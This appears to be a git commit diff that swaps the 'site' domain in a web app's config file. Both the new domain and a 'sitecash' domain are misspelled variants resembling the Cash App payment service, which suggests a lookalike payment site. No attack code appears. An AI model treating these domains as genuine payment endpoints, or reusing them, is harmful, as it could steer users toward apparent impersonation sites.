0c3ec5e59361b5bd7450083d4803f1665e7a8223
mikejson7856 <163439483+mikejson7856@users.noreply.github.com>
2025-05-31 22:08:09 +0600

    Update index.js

--- app/config/index.js
+++ app/config/index.js
@@ -1,4 +1,4 @@
 export const API_URL = "https://meetbackend-three.vercel.app";
 
-export const site = "front-accept.vercel.app";
+export const site = "caash-app-link.online";
 export const sitecash = "payment-cshappp-0.online";
